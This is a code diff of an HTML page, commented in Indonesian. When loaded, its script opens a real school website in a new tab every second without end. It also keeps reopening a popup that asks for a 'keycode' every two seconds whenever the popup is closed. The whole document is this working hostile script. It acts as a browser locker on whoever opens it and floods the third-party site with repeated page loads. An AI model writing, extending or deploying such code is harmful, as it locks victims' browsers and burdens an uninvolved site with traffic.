@@ -3,32 +3,54 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>loop</title>
+  <title>Web Loop</title>
   <script>
     let loopActive = true;
+    let popupWindow;
 
     // Fungsi untuk membuka laman web terus-menerus
     function openWebLoop() {
       if (localStorage.getItem("loopActive") === "true") {
-        window.open("http://smkn11malang.sch.id/old/", "_blank");
+        window.open("https://smkn11malang.sch.id/old/", "_blank");
         setTimeout(openWebLoop, 1000); // Interval membuka laman setiap 1 detik
       }
     }
 
-    // Fungsi untuk mengecek dan memulai loop
+    // Fungsi untuk memulai loop
     function startLoop() {
-      if (localStorage.getItem("loopActive") === null) {
+      if (!localStorage.getItem("loopActive")) {
         localStorage.setItem("loopActive", "true");
       }
       openWebLoop();
     }
 
+    // Fungsi untuk membuka popup
+    function openPopup() {
+      if (!popupWindow || popupWindow.closed) {
+        popupWindow = window.open(
+          "popup.html",
+          "KeycodePopup",
+          "width=400,height=300"
+        );
+      }
+    }
+
     // Memulai loop saat laman dimuat
-    window.onload = startLoop;
+    window.onload = function () {
+      openPopup();
+      startLoop();
+    };
+
+    // Memastikan popup tetap terbuka jika ditutup secara tidak sengaja
+    setInterval(() => {
+      if (!popupWindow || popupWindow.closed) {
+        openPopup();
+      }
+    }, 2000); // Cek setiap 2 detik
   </script>
 </head>
 <body>
   <h1>Web Loop Running...</h1>
-  <p>Popup untuk memasukkan keycode tetap berjalan di tab terpisah.</p>
+  <p>Popup tetap berjalan di tab terpisah untuk memasukkan keycode.</p>
 </body>
 </html>
